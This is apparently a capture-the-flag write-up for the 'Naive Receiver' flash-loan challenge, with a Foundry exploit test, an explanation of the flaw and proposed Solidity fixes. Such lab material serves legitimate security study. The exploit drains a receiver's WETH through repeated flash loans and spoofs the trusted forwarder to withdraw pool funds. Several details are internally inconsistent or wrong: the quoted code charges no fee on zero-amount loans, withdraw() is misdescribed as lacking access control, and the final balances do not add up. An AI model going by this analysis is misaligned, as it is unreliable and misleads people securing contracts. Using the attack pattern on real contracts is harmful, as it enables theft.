## Challenge 2: Naive Receiver

### Vulnerability
The `NaiveReceiverPool` allows anyone to request flash loans on behalf of any receiver, and the receiver pays fees without validation.

### Exploit Code
```solidity
// In NaiveReceiver.t.sol - test_naiveReceiver() function
function test_naiveReceiver() public checkSolvedByPlayer {
    // Prepare the multicall: 10 flash loans + 1 withdraw
    bytes[] memory calls = new bytes[](11);

    // 10 flash loans (0 amount, but 1 WETH fee each)
    for (uint i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(
            pool.flashLoan,
            (address(receiver), address(pool.weth()), 0, "")
        );
    }

    // Withdraw all WETH from the pool to recovery address
    calls[10] = abi.encodeCall(
        pool.withdraw,
        (1000 ether, payable(recovery))
    );

    // Owner is the original deployer of the pool
    address owner = address(100); // Standard in this challenge

    // Use the forwarder to call multicall, so _msgSender() returns owner
    // We impersonate the forwarder to call execute()
    vm.startPrank(address(forwarder));

    // forwarder.execute(target, data, forwarderSender)
    forwarder.execute{value: 0}(
        address(pool),
        abi.encodeCall(pool.multicall, (calls)),
        owner // This gets appended to msg.data, making _msgSender() = owner
    );

    vm.stopPrank();

    // ✅ FlashLoanReceiver balance should now be 0
    // ✅ recovery should receive 1000 WETH from pool (fees stay in pool)
    // Challenge solved!
}   
```

### Why it works
1. Flash loans can be called on behalf of any receiver
2. Receiver pays 1 ETH fee per loan without validation
3. Multicall allows executing multiple operations in single transaction
4. After draining receiver, we can withdraw pool funds to recovery address

### Fix
**File:** `src/naive-receiver/NaiveReceiverPool.sol`
**Vulnerable Code (lines ~76-85):**
```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // No validation that msg.sender == address(receiver)!
    
    if (token != address(weth)) revert UnsupportedCurrency();
    if (amount >= FLASH_LOAN_FEE) {
        weth.transfer(address(receiver), amount);
        
        totalFees += FLASH_LOAN_FEE;
        
        if (receiver.onFlashLoan(msg.sender, token, amount, FLASH_LOAN_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }
        
        // Fee is deducted from receiver regardless of who initiated!
        weth.transferFrom(address(receiver), address(this), amount + FLASH_LOAN_FEE);
    }
    return true;
}
```

**The Problem:** Anyone can call `flashLoan()` on behalf of any receiver contract. The receiver pays the fee but has no control over when loans are taken.

**Additional Vulnerability in `withdraw()` (lines ~103-108):**
```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // No access control - anyone can withdraw to any address!
    deposits[msg.sender] = deposits[msg.sender] - amount;
    weth.transfer(receiver, amount);
}
```

**Fixed Code:**
```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    // ADD: Require caller is the receiver or approved operator
    require(
        msg.sender == address(receiver) || 
        isApprovedOperator[address(receiver)][msg.sender],
        "Unauthorized flash loan"
    );
    
    if (token != address(weth)) revert UnsupportedCurrency();
    // ... rest of function
}

// Add operator approval system
mapping(address => mapping(address => bool)) public isApprovedOperator;

function setOperatorApproval(address operator, bool approved) external {
    isApprovedOperator[msg.sender][operator] = approved;
}

function withdraw(uint256 amount, address payable receiver) external {
    // ADD: Require receiver is msg.sender or approved
    require(
        receiver == msg.sender || 
        isApprovedOperator[msg.sender][address(receiver)],
        "Unauthorized withdrawal destination"
    );
    
    deposits[msg.sender] = deposits[msg.sender] - amount;
    weth.transfer(receiver, amount);
}
```
